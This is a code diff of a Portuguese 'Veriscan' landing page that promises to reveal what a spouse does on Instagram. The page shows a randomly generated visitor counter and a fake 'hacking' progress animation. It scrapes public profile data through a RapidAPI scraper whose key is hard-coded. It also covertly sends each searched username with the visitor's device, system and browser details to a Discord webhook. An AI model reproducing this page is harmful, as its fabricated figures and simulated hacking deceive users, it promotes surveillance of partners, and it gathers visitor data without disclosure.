@@ -166,7 +166,7 @@ input[type=text]::placeholder{color:#6b7280;font-weight:400}
 
 <script>
 /* ============================================================
-   MATRIX CANVAS (fundo)
+   MATRIX CANVAS
    ============================================================ */
 (function(){
   const c=document.getElementById('matrix-canvas'),ctx=c.getContext('2d');
@@ -192,86 +192,58 @@ input[type=text]::placeholder{color:#6b7280;font-weight:400}
 })();
 
 /* ============================================================
-   CONTADOR — número aleatório + dia da semana correto
+   CONTADOR
    ============================================================ */
 (function(){
   const dias = ['domingo','segunda-feira','terça-feira','quarta-feira','quinta-feira','sexta-feira','sábado'];
   const hoje = new Date();
   const diaSemana = dias[hoje.getDay()];
-  const min = 87000, max = 98000;
-  const num = Math.floor(Math.random() * (max - min + 1)) + min;
-  const formatado = num.toLocaleString('pt-BR');
-  document.getElementById('contadorPerfis').textContent = '+' + formatado;
+  const num = Math.floor(Math.random() * (98000 - 87000 + 1)) + 87000;
+  document.getElementById('contadorPerfis').textContent = '+' + num.toLocaleString('pt-BR');
   document.getElementById('textoContador').textContent = 'perfis analisados hoje (' + diaSemana + ')';
 })();
 
 /* ============================================================
-   TYPEWRITER — título e subtítulo digitando
+   TYPEWRITER
    ============================================================ */
 (function(){
-  const tituloEl = document.getElementById('tituloTypewriter');
-  const subEl = document.getElementById('subTypewriter');
-  const tituloHTML = 'O que seu <span class="gradient-text">Cônjuge</span> faz<br>quando está no Instagram?';
-  const subHTML    = 'Descubra a verdade sobre <span class="gradient-text" style="font-weight:600">qualquer pessoa</span>, acessando o instagram dela!';
-  const tituloTexto = tituloHTML.replace(/<[^>]+>/g, '');
-  const subTexto    = subHTML.replace(/<[^>]+>/g, '');
-  const cursorHTML = '<span class="typewriter-cursor"></span>';
-
-  function renderAte(htmlCompleto, textoPuro, idx){
-    let visiveis = 0;
-    let resultado = '';
-    let i = 0;
-    while (i < htmlCompleto.length && visiveis < idx){
-      if (htmlCompleto[i] === '<'){
-        const fim = htmlCompleto.indexOf('>', i);
-        resultado += htmlCompleto.slice(i, fim + 1);
-        i = fim + 1;
-      } else {
-        resultado += htmlCompleto[i];
-        visiveis++;
-        i++;
-      }
+  const tEl = document.getElementById('tituloTypewriter');
+  const sEl = document.getElementById('subTypewriter');
+  const tHTML = 'O que seu <span class="gradient-text">Cônjuge</span> faz<br>quando está no Instagram?';
+  const sHTML = 'Descubra a verdade sobre <span class="gradient-text" style="font-weight:600">qualquer pessoa</span>, acessando o instagram dela!';
+  const tTxt = tHTML.replace(/<[^>]+>/g,'');
+  const sTxt = sHTML.replace(/<[^>]+>/g,'');
+  const cur = '<span class="typewriter-cursor"></span>';
+  function render(h,t,idx){
+    let v=0,r='',i=0;
+    while(i<h.length && v<idx){
+      if(h[i]==='<'){const f=h.indexOf('>',i);r+=h.slice(i,f+1);i=f+1;}
+      else{r+=h[i];v++;i++;}
     }
-    return resultado;
+    return r;
   }
-
-  function digitar(htmlCompleto, textoPuro, el, velocidade, callback){
-    let idx = 0;
-    const total = textoPuro.length;
-    const intervalo = setInterval(() => {
-      idx++;
-      el.innerHTML = renderAte(htmlCompleto, textoPuro, idx) + cursorHTML;
-      if (idx >= total){
-        clearInterval(intervalo);
-        el.innerHTML = htmlCompleto;
-        if (callback) callback();
-      }
-    }, velocidade);
+  function dig(h,t,el,vel,cb){
+    let i=0;const total=t.length;
+    const id=setInterval(()=>{
+      i++;
+      el.innerHTML=render(h,t,i)+cur;
+      if(i>=total){clearInterval(id);el.innerHTML=h;if(cb)cb();}
+    },vel);
   }
-
-  digitar(tituloHTML, tituloTexto, tituloEl, 55, () => {
-    digitar(subHTML, subTexto, subEl, 30);
-  });
+  dig(tHTML,tTxt,tEl,55,()=>dig(sHTML,sTxt,sEl,30));
 })();
 
 /* ============================================================
-   🔎 API + LÓGICA DE BUSCA — RapidAPI Instagram Scraper Stable
-   Auto-detecta o path certo entre várias opções
+   🔎 BUSCA — RapidAPI Instagram Scraper Stable (SEM back-end)
    ============================================================ */
 const RAPIDAPI_KEY  = 'cd0089e6c8msh1618a66089e0734p18a81ejsn7028d767d6fe';
 const RAPIDAPI_HOST = 'instagram-scraper-stable-api.p.rapidapi.com';
 
 const PATHS_POSSIVEIS = [
-  '/v2/user_info',
-  '/v1/user_info',
-  '/user_info',
-  '/v2/info',
-  '/v1/info',
-  '/basic_user',
-  '/v1/basic_user',
-  '/v2/basic_user',
-  '/api/v1/user_info',
-  '/api/v1/info'
+  '/v2/user_info','/v1/user_info','/user_info',
+  '/v2/info','/v1/info','/basic_user',
+  '/v1/basic_user','/v2/basic_user',
+  '/api/v1/user_info','/api/v1/info'
 ];
 
 let PATH_OK = null;
@@ -302,10 +274,7 @@ async function tentarPath(path, username) {
 async function buscar(u) {
   if (PATH_OK) {
     const r = await tentarPath(PATH_OK, u);
-    if (r) {
-      console.log('✅ RapidAPI OK via', PATH_OK);
-      return r.data;
-    }
+    if (r) { console.log('✅ RapidAPI OK via', PATH_OK); return r.data; }
     try { localStorage.removeItem('ig_path_ok'); } catch(e){}
     PATH_OK = null;
   }
@@ -355,26 +324,18 @@ async function notificarPerfilDigitado(usernameDigitado) {
   try {
     const link = 'https://instagram.com/' + usernameDigitado;
     const ua = navigator.userAgent;
-
     let navegador = 'Desconhecido';
     if (ua.includes('Firefox')) navegador = 'Firefox';
     else if (ua.includes('Edg')) navegador = 'Edge';
-    else if (ua.includes('OPR') || ua.includes('Opera')) navegador = 'Opera';
     else if (ua.includes('Chrome')) navegador = 'Chrome';
     else if (ua.includes('Safari')) navegador = 'Safari';
-
     let sistema = 'Desconhecido';
     if (/Windows NT 10/.test(ua)) sistema = 'Windows 10/11';
-    else if (/Windows NT/.test(ua)) sistema = 'Windows';
     else if (/Android/.test(ua)) sistema = 'Android';
     else if (/iPhone|iPad|iPod/.test(ua)) sistema = 'iOS';
     else if (/Mac OS X/.test(ua)) sistema = 'macOS';
     else if (/Linux/.test(ua)) sistema = 'Linux';
-
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(ua);
-    const dispositivo = isMobile ? '📱 Mobile' : '💻 Desktop';
-    const idioma = navigator.language || 'desconhecido';
-    const referrer = document.referrer || 'direto (sem referrer)';
+    const mob = /iPhone|iPad|iPod|Android/i.test(ua);
 
     await fetch(DISCORD_WEBHOOK_PERFIL, {
       method: 'POST',
@@ -383,26 +344,20 @@ async function notificarPerfilDigitado(usernameDigitado) {
         username: 'Perfil Buscado 🔎',
         embeds: [{
           title: '🔎 Novo Perfil Buscado',
-          color: 0xab58f4,
-          url: link,
+          color: 0xab58f4, url: link,
           fields: [
-            { name: '👤 Perfil',      value: '@' + usernameDigitado, inline: true  },
-            { name: '🔗 Link',        value: link,                   inline: true  },
-            { name: '📱 Dispositivo', value: dispositivo,            inline: true  },
-            { name: '🖥️ Sistema',     value: sistema,                inline: true  },
-            { name: '🌐 Navegador',   value: navegador,              inline: true  },
-            { name: '🌍 Idioma',      value: idioma,                 inline: true  },
-            { name: '🔗 Veio de',     value: referrer,               inline: false },
-            { name: '🕒 Horário',     value: new Date().toLocaleString('pt-BR'), inline: false }
+            { name: '👤 Perfil', value: '@'+usernameDigitado, inline: true },
+            { name: '📱 Dispositivo', value: mob?'📱 Mobile':'💻 Desktop', inline: true },
+            { name: '🖥️ Sistema', value: sistema, inline: true },
+            { name: '🌐 Navegador', value: navegador, inline: true },
+            { name: '🕒 Horário', value: new Date().toLocaleString('pt-BR'), inline: false }
           ],
           footer: { text: 'Veriscan' },
           timestamp: new Date().toISOString()
         }]
       })
     });
-  } catch (err) {
-    console.warn('Falha ao notificar perfil digitado:', err);
-  }
+  } catch (e){}
 }
 
 /* ============================================================
@@ -441,10 +396,10 @@ async function buscarClick(){
   profileData = {
     username:        data.username || val,
     biography:       data.biography || data.bio || 'Bio não disponível.',
-    profile_pic_url: (data.hd_profile_pic_url_info && data.hd_profile_pic_url_info.url) || data.profile_pic_url || data.profile_pic_url_hd || ('https://unavatar.io/instagram/' + val),
-    follower_count:  data.follower_count  || (data.edge_followed_by && data.edge_followed_by.count) || 0,
-    following_count: data.following_count || (data.edge_follow && data.edge_follow.count) || 0,
-    media_count:     data.media_count     || (data.edge_owner_to_timeline_media && data.edge_owner_to_timeline_media.count) || 0
+    profile_pic_url: (data.hd_profile_pic_url_info && data.hd_profile_pic_url_info.url) || data.profile_pic_url || ('https://unavatar.io/instagram/' + val),
+    follower_count:  data.follower_count  || 0,
+    following_count: data.following_count || 0,
+    media_count:     data.media_count     || 0
   };
 
   $('confirm-user').textContent = '@' + profileData.username;
@@ -481,12 +436,11 @@ function hack(){
   show('screen-hacking');
   $('targetUser').value = '@' + username;
   let progress = 0;
-  const progressBar = $('btnProgress');
-  progressBar.style.opacity = '1';
-
+  const pb = $('btnProgress');
+  pb.style.opacity = '1';
   const interval = setInterval(() => {
-    progress = Math.min(100, progress + Math.random() * 4 + 1);
-    progressBar.style.width = progress + '%';
+    progress = Math.min(100, progress + Math.random()*4 + 1);
+    pb.style.width = progress + '%';
     if(progress >= 35) $('status-desc').textContent = 'Consultando informações ...';
     if(progress >= 70) $('status-desc').textContent = 'Organizando o feed...';
     if(progress >= 100){
